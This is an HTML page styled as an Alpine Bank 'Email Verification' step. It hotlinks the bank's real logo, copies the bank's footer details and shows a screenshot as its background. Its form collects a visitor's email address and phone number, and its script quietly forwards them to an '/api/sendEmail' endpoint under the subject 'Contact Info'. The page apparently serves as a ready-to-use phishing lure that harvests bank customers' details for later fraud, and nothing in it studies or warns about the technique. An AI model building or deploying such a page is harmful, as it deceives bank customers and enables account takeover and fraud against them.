<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Email & Phone Verification</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body, html {
      height: 100%;
      margin: 0;
      padding: 0;
    }
    body {
      background: url('Screenshot 2025-06-27 180535.png') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .verify-box {
      display: block;
                background-color: #1F1F1F;
                box-shadow: var(--card-shadow);
                border-radius: var(--card-corner-radius);
                margin-bottom: 16px;
                margin-left: auto;
                margin-right: auto;
                box-sizing: border-box;
                max-width: 480px;
                width: 90%;
                padding: 45px }
    .logo {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 18px;
      margin-bottom: 24px;
    }
    .logo-img {
      width: 244px;
      height: 64px;
      object-fit: contain;
      background: none;
      border-radius: 0;
      box-shadow: none;
      display: block;
    }
    h2 {
      color: #fff;
      font-family: 'Inter', Arial, sans-serif;
      font-size: 1.55rem;
      margin-bottom: 28px;
      text-align: center;
      position: relative;

    }
    .verify-form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 18px;
    }
    .input-group {
      position: relative;
      margin-bottom: 0;
      width: 100%;
    }
    .input-group input {
      width: 100%;
      padding: 1.4rem 1rem 0.6rem;
      background: #1a1a1a;
      border-radius: 6px;
      outline: none;
      font-size: 1.25rem;
      transition: all 0.2s ease-in-out;
      height: 3.4rem;
      color: #fff;
      border: 1px solid #555;
      font-family: 'Inter', Arial, sans-serif;
      font-weight: 400;
    }
    .input-group label {
      position: absolute;
      top: 54%;
      left: 1rem;
      transform: translateY(-50%);
      background: #181818;
      color: #6c746f;
      padding: 0 4px;
      font-size: 1.08rem;
      pointer-events: none;
      transition: 0.2s ease;
      font-family: 'Inter', Arial, sans-serif;
      font-weight: 400;
    }
    .input-group input:focus,
    .input-group input:valid {
      border: 2px solid #00a680;
    }
    .input-group input:focus + label,
    .input-group input:valid + label {
      top: 0;
      left: 0.8rem;
      font-size: 0.85rem;
      color: #00a680;
      font-weight: 400;
    }
    .continue-btn {
      width: 100%;
      padding: 0.9rem 1.4rem;
      background-color: #0d38b0;
      color: white;
      font-weight: 700;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1.08rem;
      margin-top: 18px;
      font-family: 'Inter', Arial, sans-serif;
    }
    .continue-btn:hover {
      background: #0047d3;
    }
    .success-message {
      color: #00a680;
      margin-top: 18px;
      text-align: center;
      font-size: 1.1rem;
      font-family: 'Inter', Arial, sans-serif;
    }
    .login-box {
      background-color: #1F1F1F;
      border-radius: 10px;
      box-shadow: 0 3px 12px 0 rgba(0,0,0,0.15);
      max-width: 400px;
      width: 100%;
      padding: 32px 18px 24px 18px;
      margin: 32px auto;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
    * {
      font-family: 'Inter', Arial, sans-serif;
      box-sizing: border-box;
    }
    .footer {
      width: 100vw;
      background: #1F1F1F;
      color: #bdbdbd;
      position: fixed;
      left: 0;
      bottom: 0;
      z-index: 100;
      padding: 0;
      margin: 0;
      box-shadow: 0 -2px 8px rgba(0,0,0,0.08);
      box-sizing: border-box;
    }
    .footer-content {
      width: 100vw;
      margin: 0 auto;
      padding: 2px 12px;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: center;
      font-size: 0.92rem;
      gap: 8px 14px;
      color: #888;
      box-sizing: border-box;
    }
    .footer-content > * {
      flex-shrink: 1;
      min-width: 0;
      white-space: nowrap;
    }
    .footer-link {
      color: #00a680;
      text-decoration: none;
      transition: text-decoration 0.2s;
    }
    .footer-link:hover {
      text-decoration: underline;
    }
    .dot {
      margin: 0 5px;
      color: #bdbdbd;
      font-size: 1.1em;
    }
  </style>
</head>
<body>
  <div class="background">
    <div class="login-box">
      <div class="logo">
        <img src="https://online.alpinebank.com/images/fi-assets/alpine-bank/alpine-bank-logo-48b3923a.png" alt="Logo" class="logo-img">
      </div>
      <h2>Email Verification<br><br><span style="font-weight:100;font-size:1rem;color: #ccc8c8;">Confirm Your Email and Phone Number Information</span></h2>
      <form class="verify-form" id="verifyForm">
        <div class="input-group">
          <input type="email" id="email" name="email" required autocomplete="email" />
          <label for="email">Email Address</label>
        </div>
        <div class="input-group">
          <input type="tel" id="phone" name="phone" required inputmode="numeric" pattern="[0-9]*" autocomplete="tel" />
          <label for="phone">Phone Number</label>
        </div>
        <button type="submit" class="continue-btn">Continue</button>
      </form>
      <div class="success-message" id="successMsg" style="display:none;">Verification info sent!</div>
    </div>
  </div>
  <footer class="footer">
    <div class="footer-content">
      <span>© 2025 Alpine Bank</span>
      <span class="dot">•</span>
      <span>(800) 551-6098</span>
      <span class="dot">•</span>
      <a href="#" class="footer-link">Privacy policy</a>
      <span class="dot">•</span>
      <span>Member FDIC</span>
      <span class="dot">•</span>
      <span class="icon-text">
        Equal Housing Lender
      </span>
    </div>
  </footer>
  <script>
    document.getElementById('verifyForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const phone = document.getElementById('phone').value.trim();
      if (!email || !phone) {
        alert('Please fill in both fields.');
        return;
      }
      const res = await fetch('/api/sendEmail', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email,
          message: phone,
          subject: 'Contact Info'
        })
      });
      const data = await res.json();
      if (res.ok) {
        document.getElementById('successMsg').style.display = 'block';
        setTimeout(() => { document.getElementById('successMsg').style.display = 'none'; }, 3000);
        document.getElementById('verifyForm').reset();
      } else {
        alert('Error: ' + (data.message || 'Could not send email.'));
      }
    });
  </script>
</body>
</html>
